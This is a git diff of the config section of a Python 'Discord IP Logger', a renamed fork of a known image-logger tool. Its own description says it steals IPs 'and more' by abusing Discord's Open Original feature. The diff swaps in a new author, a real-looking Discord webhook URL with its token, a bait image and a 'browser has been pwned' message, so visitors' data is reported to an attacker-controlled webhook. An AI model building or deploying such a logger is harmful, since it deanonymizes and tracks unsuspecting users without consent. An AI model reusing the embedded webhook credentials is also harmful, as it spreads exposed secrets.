@@ -1,24 +1,23 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# Discord IP Logger
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
+__app__ = "Discord IP Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "CID"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1334994830517993552/MpqAcsKa13aPyH74rT6Ttfpj4TBFAeKoC0NVWI4AF24TmPOmZK-A6HTaJTbb8JwA-vqm",
-    "image": "https://thunderdungeon.com/wp-content/uploads/2024/10/anime-memes-topimage-20241003.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340910948231151666/-FEC8VLZ8WwDF7V3wwhS19uqtEiXo4YK_UnFrVzpFLCi6vJmnaFPXrt693tAB-S8MuYD",
+    "image": "https://i.ibb.co/1fnqnqzz/Roblox-2025-01-08-02-08-57.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "IP INFO 🥵", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +27,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by CUD IP Logger.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
